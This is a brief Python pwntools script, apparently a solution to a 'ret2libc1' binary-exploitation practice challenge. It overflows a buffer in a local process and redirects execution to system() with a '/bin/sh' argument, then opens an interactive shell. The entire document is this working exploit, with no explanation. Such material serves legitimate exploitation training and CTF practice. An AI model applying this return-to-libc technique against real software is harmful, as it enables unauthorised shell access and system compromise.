from pwn import *
sh = process("./ret2libc1")
offset = 0x6c
sys_plt = 0x08048460
bin_plt = 0x08048720
payload = b"a"*offset + b"b"*0x4 + p32(sys_plt) + b"c"*0x4 +p32(bin_plt)
sh.sendline(payload)
sh.interactive()
